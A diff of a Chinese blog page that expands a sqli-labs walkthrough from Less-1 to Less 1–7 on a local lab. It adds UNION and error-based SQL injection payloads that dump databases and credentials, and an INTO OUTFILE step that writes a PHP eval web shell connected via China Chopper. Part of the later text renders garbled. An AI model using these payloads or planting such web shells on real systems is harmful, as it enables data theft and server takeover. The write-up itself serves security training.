@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="-web前端 -mysql," />
+  <meta name="keywords" content="-web -mysql," />
 
 
 
@@ -81,12 +81,12 @@
 
 
 
-<meta name="description" content="前言在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，在群文件的《web安全方向入门学习计划表》中就提供了靶场的下载途径。让我们先从sqli-labs开始练习SQL注入。  关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达">
+<meta name="description" content="前言在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，让我们先从sqli-labs开始练习SQL注入。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。  关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs练习 less1">
-<meta property="og:url" content="http://example.com/2021/09/26/sqli-labs%E7%BB%83%E4%B9%A0-less1/index.html">
+<meta property="og:title" content="sqli-labs练习-less1-7">
+<meta property="og:url" content="http://example.com/2021/09/26/sqli-labs%E7%BB%83%E4%B9%A0-less1-7/index.html">
 <meta property="og:site_name" content="mrl64&#39;s Blog">
-<meta property="og:description" content="前言在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，在群文件的《web安全方向入门学习计划表》中就提供了靶场的下载途径。让我们先从sqli-labs开始练习SQL注入。  关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达">
+<meta property="og:description" content="前言在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，让我们先从sqli-labs开始练习SQL注入。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。  关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2021/09/26/8K3qmxVOuobTEfN.png">
 <meta property="og:image" content="https://i.loli.net/2021/09/26/auv2h4DXMHigRqt.png">
@@ -97,10 +97,11 @@
 <meta property="og:image" content="https://i.loli.net/2021/09/26/adIDCEl3B6UpXvN.png">
 <meta property="og:image" content="https://i.loli.net/2021/09/26/tdTSe6EAu4skVJg.png">
 <meta property="og:image" content="https://i.loli.net/2021/09/26/FPsWJKguSoXb1Iy.png">
+<meta property="og:image" content="https://i.loli.net/2021/09/28/DzJBOihmvMFQknd.png">
 <meta property="article:published_time" content="2021-09-26T08:25:32.000Z">
-<meta property="article:modified_time" content="2021-09-27T14:00:36.082Z">
+<meta property="article:modified_time" content="2021-11-19T14:46:22.495Z">
 <meta property="article:author" content="liszt_lin">
-<meta property="article:tag" content="-web前端 -mysql">
+<meta property="article:tag" content="-web -mysql">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://i.loli.net/2021/09/26/8K3qmxVOuobTEfN.png">
 
@@ -132,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/09/26/sqli-labs练习-less1/"/>
+  <link rel="canonical" href="http://example.com/2021/09/26/sqli-labs练习-less1-7/"/>
 
 
 
 
 
-  <title>sqli-labs练习 less1 | mrl64's Blog</title>
+  <title>sqli-labs练习-less1-7 | mrl64's Blog</title>
   
 
 
@@ -275,7 +276,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/26/sqli-labs%E7%BB%83%E4%B9%A0-less1/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/26/sqli-labs%E7%BB%83%E4%B9%A0-less1-7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -292,7 +293,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs练习 less1</h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs练习-less1-7</h1>
         
 
         <div class="post-meta">
@@ -365,12 +366,12 @@
 
       
         <blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，在群文件的《web安全方向入门学习计划表》中就提供了靶场的下载途径。让我们先从sqli-labs开始练习SQL注入。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，让我们先从sqli-labs开始练习SQL注入。<br>ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。</p>
 </blockquote>
 <h1 id="关于SQL注入"><a href="#关于SQL注入" class="headerlink" title="关于SQL注入"></a>关于SQL注入</h1><p>在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。</p>
 <span id="more"></span>
 <p>而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，接下来我们来具体分析sqli-labs靶场中的第一关来深刻认识SQL注入。</p>
-<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p>首先进入less-1的界面，我们可以看到一行字：</p>
+<h1 id="less1-4"><a href="#less1-4" class="headerlink" title="less1-4"></a>less1-4</h1><p>首先进入less-1的界面，我们可以看到一行字：</p>
 <ul>
 <li>Please input the ID as parameter with numeric value</li>
 </ul>
@@ -382,19 +383,61 @@
 <p>那么为什么会出现这一段文字呢，我们借助文件的源码进行分析:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;</span><br><span class="line">  	echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">	echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br></pre></td></tr></table></figure>
 <p>通过分析以上部分源码，我们可以发现，当你输入一个id时，这个文件得到了一个id，if函数执行true下的代码段，将本次查询记录到result的txt文件中，并从数据库中查询，显示信息。因此当我们输入?id=1时网页能够返回账号密码。而当我们输入?id=1’时，我们可以发现，第11行代码得到id为1’后，即把$id替换为1’后，代码中出现了三个单引号，这就将导致单引号无法正确对应，引起报错。</p>
-<p>既然多输入了一个单引号，我们就要想办法把多余出来的那个单引号排除掉，在SQL注入中，最常用的方法便是注释，我们在域名最后添加上注释符：<br><code>http://127.0.0.1/Less-1/?id=1%27--+</code><br>或者我们可以将–+替换为#（%23）</p>
+<p>既然多输入了一个单引号，我们就要想办法把多余出来的那个单引号排除掉，在SQL注入中，最常用的方法便是注释，我们在域名最后添加上注释符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1%27--+</span><br></pre></td></tr></table></figure>
+<p>或者我们可以将–+替换为#（%23）</p>
 <p>这样我们发现，回车后的页面重新显示正常，这时我们可以进行测试判断此处是否有注入点。我们可以使用<code>and 1=1</code>和<code>and 1=2</code>进行判断，其中<code>1=1</code>表示恒为真，<code>1=2</code>表示恒为假。通过下两图我们可以发现两者显示页面不同，说明在此处存在注入点：<br><img src="https://i.loli.net/2021/09/26/auv2h4DXMHigRqt.png"><br><img src="https://i.loli.net/2021/09/26/9rthv6QVWblSOzA.png"></p>
 <p>既然存在注入点，我们就要想办法在此处获取我们需要的数据。由于第11行这句代码本身就是select语句，因此我们在进行查询时需要运用到union语句来合并两个select语句的结果。不过要注意，使用union语句的先决条件是语句内部的SELECT语句必须拥有相同数量的列，因此我们需要先获取表格中的字段数。<br>使用order by语句进行字段数查询，当我们测试到order by 4时，发现文档页面出现了以下的提示：</p>
 <ul>
 <li>Unknown column ‘4’ in ‘order clause’</li>
 </ul>
-<p>无法识别第4列，这就说明表格中只有3列，我们就可以运用union语句来进行注入。首先我们将id改为-1，接着注入以下代码来获取显示页面对应的字段：<br><code>union select 1,2,3</code><br><img src="https://i.loli.net/2021/09/26/PMbsNQHaROnEZc9.png"></p>
-<p>可以发现账户与密码两列对应的字段数为2和3，那么在下述的操作中，我们就可以将union语句中的2或3替换成新的select语句来获取我们想要的信息，例如我们可以将上述域名中的2替换为下列代码来查询全部数据库的名称：<br><code>(select group_concat(schema_name) from information_schema.schemata)</code><br><img src="https://i.loli.net/2021/09/26/WmAuCIDX4VysM6j.png"></p>
+<p>无法识别第4列，这就说明表格中只有3列，我们就可以运用union语句来进行注入。首先我们将id改为-1，接着注入以下代码来获取显示页面对应的字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/26/PMbsNQHaROnEZc9.png"></p>
+<p>可以发现账户与密码两列对应的字段数为2和3，那么在下述的操作中，我们就可以将union语句中的2或3替换成新的select语句来获取我们想要的信息，例如我们可以将上述域名中的2替换为下列代码来查询全部数据库的名称：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select group_concat(schema_name) from information_schema.schemata)</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/26/WmAuCIDX4VysM6j.png"></p>
 <p>或者使用将2替换为database()查询当前数据库的名称<br><img src="https://i.loli.net/2021/09/26/8vkTrepH9uSQPVy.png"></p>
-<p>这样我们就得到了我们要查找的数据库的名称，我们知道，数据存在于数据表里，而数据表又存在于数据库里，所以接下来我们需要获得数据库内所有表的名称。我们可以将原来2的位置继续替换成下列代码进行查询：<br><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39; </code><br><img src="https://i.loli.net/2021/09/26/adIDCEl3B6UpXvN.png"></p>
-<p>取得了表名之后我们就可以想办法获得其中的数据了，数据储存在数据表的列当中，我们需要继续获得列名，这里我们获取users表中的列名，同样替换原来2的位置：<br><code>select group_concat(column_name) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39; </code><br><img src="https://i.loli.net/2021/09/26/tdTSe6EAu4skVJg.png"></p>
-<p>做到这里，我们就可以愉快的获取到我们想要的信息了<br><code>select group_concat(列名) from 数据库名.数据表名</code><br><img src="https://i.loli.net/2021/09/26/FPsWJKguSoXb1Iy.png"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>SQL注入第一关的解题流程大致就是这样，实际上，在解题时的关键点就在于找到SQL注入点，只有找到注入点我们才能进行SQL注入，从而获得我们想要的数据。后续的每一关都会有一个提示，我们要根据提示找到那个注入点，找到注入点之后我们就可以一步一步地将数据从数据库中取出。</p>
+<p>这样我们就得到了我们要查找的数据库的名称，我们知道，数据存在于数据表里，而数据表又存在于数据库里，所以接下来我们需要获得数据库内所有表的名称。我们可以将原来2的位置继续替换成下列代码进行查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27; </span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/26/adIDCEl3B6UpXvN.png"></p>
+<p>取得了表名之后我们就可以想办法获得其中的数据了，数据储存在数据表的列当中，我们需要继续获得列名，这里我们获取users表中的列名，同样替换原来2的位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/26/tdTSe6EAu4skVJg.png"></p>
+<p>做到这里，我们就可以愉快的获取到我们想要的信息了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(列名) from 数据库名.数据表名</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/26/FPsWJKguSoXb1Iy.png"></p>
+<p>less-2是数字型注入，less-3是单引号括号闭合注入，less-4是双引号括号闭合注入。z这几关的考点是联合注入。</p>
+<h1 id="less5-6"><a href="#less5-6" class="headerlink" title="less5-6"></a>less5-6</h1><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>进入第五个靶场，在我们输入id之后，我们会发现一切都变了，屏幕上只剩下一句“You are in……..”和在屏幕前一脸懵的我们。遇到这种情况先不要惊慌，还记得提示内容依然指向了单引号，既然如此，我们依然在域名最后先加上一个单引号。</p>
+<p>回车来了，报错就有了。这是一段与less-1完全一致的报错，加上注释后回显恢复正常，再用and 1=1和and 1=2检验后可以确定这里存在注入点。既然存在注入点，那就有解开它的方法。但是显然，不管我们怎样更改id的值，得到的永远只有那句“You are in……..”。</p>
+<p>显然前四关使用union联合查询的方法在这关不起作用。那么我们就得换个思路了，提示指向了双查询注入，那么我们就将目光放到双查询注入上。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/wn314/article/details/89297560">双查询注入原理浅析</a><br>我们可以先通过上面的网址简单了解双查询注入的运行原理，了解之后我们将这段floor()报错的语句摘取出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((查询语句),floor (rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+
+<p>这段代码就是我们解开问题的关键所在，将这段代码中的查询语句改为database()并补入域名之中，可以发现报错已经回显了当前所在的数据库名：<br><img src="https://i.loli.net/2021/09/28/DzJBOihmvMFQknd.png"></p>
+<p>这时我们也许会有疑问了，为什么数据库的名字变成了“security1”呢？其实这不是因为数据库的名字变了，而是这个“1”为floor()报错语句中输出的一部分，无论输出什么都会出现这个“1”，因此数据库的实际名称仍然为“security”。</p>
+<p>既然问题解决了，那么就进入了愉快的爆库流程了，但是当我们在获取表中的数据时，出现了这么一行：</p>
+<ul>
+<li>Subquery returns more than 1 row</li>
+</ul>
+<p>我们页面的信息超过了一行，在我们使用了group_concat函数的情况下显示这个报错说明了这里的字符长度超过了64位。这种情况下，我们应该使用limit数来进行一个个输出：</p>
+<figure class="highlight plaintext"><figcaption><span>concat(列名) from 数据库名.数据表名 limit 0,1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">![](https://i.loli.net/2021/09/28/1BGWukLCISofDxE.png)</span><br><span class="line"></span><br><span class="line">## 方法2</span><br><span class="line">用完floor()报错后，我就在想有没有其他的报错方法也能达到相同的效果呢，结果还真有：`updatexml(1,concat(0x7e, 查询语句,0x7e),1)`或者 `extractvalue(1,concat(0x7e,查询语句,0x7e))`</span><br><span class="line">这两句代码的具体语法可以参考下面这个链接的教程：</span><br><span class="line">[方法2中的报错注入](https://blog.csdn.net/zpy1998zpy/article/details/80631036)</span><br><span class="line"></span><br><span class="line">这里简单介绍下这两句代码的报错原理，这两句代码的第二个参数需要设置Xpath格式的字符串，而“0x7e”，即“~”开头不符合其语法，concat()函数为字符串连接函数不符合规则，导致代码中括号内的结果以错误的形式报出，达到目的。</span><br><span class="line"></span><br><span class="line">而这两句代码的字符串限制为32位，因此在进行爆表流程时，我们也应该使用limit函数将数据一行一行显示出来，达到同样效果。</span><br><span class="line">![](https://i.loli.net/2021/09/28/QF2cqUDsCgvHzpi.png)</span><br><span class="line"></span><br><span class="line">less-6是双引号闭合，这两关考的是报错注入。</span><br><span class="line"></span><br><span class="line"># less-7</span><br><span class="line">输入id后，我们发现这次的返回文字多了一段“Use outfile......”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。</span><br><span class="line"></span><br><span class="line">那么首先，我们也要先找到注入点。试试单引号，双引号，单引号加括号等多种形式，我们找到了答案为单引号加上两个括号。接下来，我们开始进行注入。</span><br><span class="line"></span><br><span class="line">首先要注意的是，我们在进行outfile文件注入的时候必须要有root权限，而且要知道网站绝对路径的地址。不过由于这个靶场是我们自己搭的，因此很容易可以满足这些条件，当然，我们也可在之前的靶场中使用`@@datadir`指令来获得数据库的路径：</span><br><span class="line">![](https://i.loli.net/2021/10/01/NsHumx4CFD76ApS.png)</span><br><span class="line"></span><br><span class="line">好有了绝对路径，直接动手，我们使用这段代码：</span><br></pre></td></tr></table></figure>
+<p>select … into outfile “绝对路径”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这段代码可以将select的内容注入进绝对路径下的一个文件，我们这里注入到一个7.php的文件下，如果没有这个文件会自动创建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最好一次成功，如果要再次写入则需要更换文件名。</span><br><span class="line"></span><br><span class="line">要特别注意的是，在复制绝对路径后，我们需要在“\”后再加上一个“\”或者将“\”改成“/”，例如：</span><br></pre></td></tr></table></figure>
+<p>D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\7.php<br>D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/7.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有代码基础的一定知道，“\”代表着转义字符，而`\\`才是意味着字符“\”。而“\”的路径是windows系统所独有的表达方式，但“/”表达的路径是可以被windows、linux和mac等操作系统共同识别的，因此更推荐第二种表达路径的方式。</span><br><span class="line"></span><br><span class="line">接下来我们要注入一句话木马了，php格式的一句话木马为：</span><br></pre></td></tr></table></figure>
+<?php @eval($_POST['chopper']);?>
+<pre><code>其中的chopper是值，前面的POST（或者REQUEST等）用来获取这个值，这个值之后要用到，可自定义。这样我们就可以使用工具（菜刀，webshell等）进行访问了。
+
+注入之后我们发现页面虽然报错，但是浏览本地文件，发现了这个7.php已经成功注入进文件夹中了，并且代码也已经被成功写入：
+![](https://i.loli.net/2021/10/01/ALn82iWcZdBbgDx.png)
+![](https://i.loli.net/2021/10/01/vwMCumkdZDHxVip.png)
+
+注入成功，我们就可以掏出我们的工具了，这里使用菜刀。
+![](https://i.loli.net/2021/10/01/VCnqKR8lzvgckyX.png)
+![](https://i.loli.net/2021/10/01/2JxMzgjCuT9REoY.png)
+如上，连接成功！
+
+</code></pre>
 
       
     </div>
@@ -412,7 +455,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/web%E5%89%8D%E7%AB%AF-mysql/" rel="tag"># -web前端 -mysql</a>
+            <a href="/tags/web-mysql/" rel="tag"># -web -mysql</a>
           
         </div>
       
@@ -435,8 +478,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2021/09/27/sqli-labs%E7%BB%83%E4%B9%A0-less2-4/" rel="prev" title="sqli-labs练习-less2-4">
-                sqli-labs练习-less2-4 <i class="fa fa-chevron-right"></i>
+              <a href="/2021/10/02/sqli-labs%E7%BB%83%E4%B9%A0-less8-17/" rel="prev" title="sqli-labs练习-less8-17">
+                sqli-labs练习-less8-17 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -514,7 +557,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -536,7 +579,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -576,7 +619,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5"><span class="nav-number"></span> <span class="nav-text">关于SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-1"><span class="nav-number"></span> <span class="nav-text">less-1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5"><span class="nav-number"></span> <span class="nav-text">关于SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less1-4"><span class="nav-number"></span> <span class="nav-text">less1-4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less5-6"><span class="nav-number"></span> <span class="nav-text">less5-6</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-number">1.</span> <span class="nav-text">方法1</span></a></li></ol></div>
             
 
           </div>
